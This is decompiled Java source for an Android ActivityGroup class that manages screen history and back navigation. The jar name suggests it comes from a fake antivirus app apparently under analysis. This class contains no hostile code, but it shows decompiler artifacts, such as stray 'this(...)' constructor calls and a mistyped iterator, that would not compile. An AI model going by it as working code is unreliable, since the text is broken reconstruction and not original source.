package com.example.androiddefender2;

import android.app.Activity;
import android.app.ActivityGroup;
import android.app.LocalActivityManager;
import android.content.Intent;
import android.view.KeyEvent;
import android.view.Window;
import android.widget.Toast;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Map;
import system.AppSingleton;

public class CustomActGroup extends ActivityGroup {
  public void addChildWithoutStart(String paramString) {
    if (!paramString.equals(""))
      (AppSingleton.getInstance()).history.add(paramString); 
  }
  
  public void back() {
    if ((AppSingleton.getInstance()).historyView.size() > 0) {
      try {
        (AppSingleton.getInstance()).historyView.remove((AppSingleton.getInstance()).historyView.size() - 1);
        setContentView((AppSingleton.getInstance()).historyView.get((AppSingleton.getInstance()).historyView.size() - 1));
      } catch (Exception exception) {
        Toast.makeText(getApplicationContext(), exception.toString(), 1).show();
      } 
      return;
    } 
    finish();
  }
  
  public boolean destroy(String paramString) {
    boolean bool = true;
    LocalActivityManager localActivityManager = getLocalActivityManager();
    if (localActivityManager != null) {
      boolean bool1;
      localActivityManager.destroyActivity(paramString, false);
      try {
        Field field = LocalActivityManager.class.getDeclaredField("mActivities");
        bool1 = bool;
        if (field != null) {
          field.setAccessible(true);
          Map map = (Map)field.get(localActivityManager);
          if (map != null)
            map.remove(paramString); 
          Field field1 = LocalActivityManager.class.getDeclaredField("mActivityArray");
          bool1 = bool;
          if (field1 != null) {
            field1.setAccessible(true);
            ArrayList arrayList = (ArrayList)field1.get(localActivityManager);
            bool1 = bool;
            if (arrayList != null) {
              Iterator<Field> iterator = arrayList.iterator();
              while (true) {
                bool1 = bool;
                if (iterator.hasNext()) {
                  field1 = iterator.next();
                  Field field2 = field1.getClass().getDeclaredField("id");
                  if (field2 != null) {
                    field2.setAccessible(true);
                    if (paramString.equals(field2.get(field1))) {
                      arrayList.remove(field1);
                      bool1 = bool;
                      break;
                    } 
                  } 
                  continue;
                } 
                break;
              } 
            } 
          } 
        } 
      } catch (Exception exception) {
        exception.printStackTrace();
        bool1 = bool;
      } 
      return bool1;
    } 
    return false;
  }
  
  public void finishActivityToBack() {
    int i = (AppSingleton.getInstance()).history.size();
    if (i > 1) {
      String str = (AppSingleton.getInstance()).history.get(i - 1);
      getLocalActivityManager().getCurrentId();
      finishFromChild(getLocalActivityManager().getActivity(str));
    } 
  }
  
  public void finishFromChild(Activity paramActivity) {
    String str;
    try {
      LocalActivityManager localActivityManager = getLocalActivityManager();
      int i = (AppSingleton.getInstance()).history.size() - 1;
      if (i < 1) {
        finish();
        return;
      } 
      localActivityManager.destroyActivity((AppSingleton.getInstance()).history.get(i), false);
      (AppSingleton.getInstance()).history.remove(i);
      (AppSingleton.getInstance()).history.size();
      str = (AppSingleton.getInstance()).history.get(i - 1);
      Activity activity = localActivityManager.getActivity(str);
      if (activity != null) {
        setContentView(localActivityManager.startActivity(str, activity.getIntent()).getDecorView());
        return;
      } 
    } catch (Exception exception) {
      Toast.makeText(getApplicationContext(), exception.getMessage(), 0).show();
      return;
    } 
    if (str.equals("Home")) {
      (DefenderApplication.getInstance()).tabHost.setCurrentTab(0);
      Intent intent = new Intent();
      this(getApplicationContext(), HomeActivity.class);
      startChildActivity("Home", intent, false);
      return;
    } 
    if (str.equals("Update")) {
      (DefenderApplication.getInstance()).tabHost.setCurrentTab(1);
      Intent intent = new Intent();
      this(getApplicationContext(), UpdateActivity.class);
      startChildActivity("Update", intent, false);
      return;
    } 
    if (str.equals("Settings")) {
      (DefenderApplication.getInstance()).tabHost.setCurrentTab(2);
      Intent intent = new Intent();
      this(getApplicationContext(), SettingsActivity.class);
      startChildActivity("Settings", intent, false);
      return;
    } 
    if (str.equals("Privacy")) {
      (DefenderApplication.getInstance()).tabHost.setCurrentTab(3);
      Intent intent = new Intent();
      this(getApplicationContext(), PrivacyActivity.class);
      startChildActivity("Privacy", intent, false);
      return;
    } 
    if (str.equals("Support")) {
      (DefenderApplication.getInstance()).tabHost.setCurrentTab(4);
      Intent intent = new Intent();
      this(getApplicationContext(), SupportActivity.class);
      startChildActivity("Support", intent, false);
    } 
  }
  
  public void finishLastActivity() {
    try {
      LocalActivityManager localActivityManager = getLocalActivityManager();
      int i = (AppSingleton.getInstance()).history.size() - 1;
      if (i < 1) {
        finish();
        return;
      } 
      localActivityManager.destroyActivity((AppSingleton.getInstance()).history.get(i), true);
      (AppSingleton.getInstance()).history.remove(i);
    } catch (Exception exception) {
      Toast.makeText(getApplicationContext(), exception.getMessage(), 0).show();
    } 
  }
  
  public Activity getCurrentActivity() {
    int i = (AppSingleton.getInstance()).history.size();
    return (AppSingleton.getInstance()).history.isEmpty() ? null : getLocalActivityManager().getActivity((AppSingleton.getInstance()).history.get(i - 1));
  }
  
  public void onBackPressed() {
    int i = (AppSingleton.getInstance()).history.size();
    if (i > 1) {
      String str = (AppSingleton.getInstance()).history.get(i - 1);
      getLocalActivityManager().getCurrentId();
      finishFromChild(getLocalActivityManager().getActivity(str));
      return;
    } 
    (AppSingleton.getInstance()).history.clear();
    finish();
  }
  
  public boolean onKeyDown(int paramInt, KeyEvent paramKeyEvent) {
    return (paramInt == 4) ? true : super.onKeyDown(paramInt, paramKeyEvent);
  }
  
  public boolean onKeyUp(int paramInt, KeyEvent paramKeyEvent) {
    if (paramInt == 4) {
      onBackPressed();
      return true;
    } 
    return super.onKeyUp(paramInt, paramKeyEvent);
  }
  
  public void replaceView(String paramString, Intent paramIntent) {
    paramString = paramString + System.currentTimeMillis();
    Window window = getLocalActivityManager().startActivity(paramString, paramIntent.addFlags(67108864));
    if (window != null) {
      (AppSingleton.getInstance()).historyView.add(window.getDecorView());
      setContentView(window.getDecorView());
    } 
  }
  
  public void startChildActivity(String paramString, Intent paramIntent, boolean paramBoolean) {
    try {
      StringBuilder stringBuilder = new StringBuilder();
      this();
      paramString = stringBuilder.append(paramString).append(System.currentTimeMillis()).toString();
      if ("restart".equalsIgnoreCase(paramString))
        (AppSingleton.getInstance()).history.clear(); 
      Window window = getLocalActivityManager().startActivity(paramString, paramIntent.addFlags(67108864));
      if (window != null) {
        if (paramBoolean && !((String)(AppSingleton.getInstance()).history.get((AppSingleton.getInstance()).history.size() - 1)).equals(paramString))
          (AppSingleton.getInstance()).history.add(paramString); 
        setContentView(window.getDecorView());
      } 
    } catch (Exception exception) {
      Toast.makeText(getApplicationContext(), exception.getMessage(), 1).show();
    } 
  }
  
  public void startIssetActivity() {
    LocalActivityManager localActivityManager = getLocalActivityManager();
    int i = (AppSingleton.getInstance()).history.size();
    String str = (AppSingleton.getInstance()).history.get(i - 1);
    Activity activity = localActivityManager.getActivity(str);
    if (activity != null)
      setContentView(localActivityManager.startActivity(str, activity.getIntent()).getDecorView()); 
  }
}


/* Location:              /home/fahim/Desktop/fake_av_reader-dex2jar.jar!/com/example/androiddefender2/CustomActGroup.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */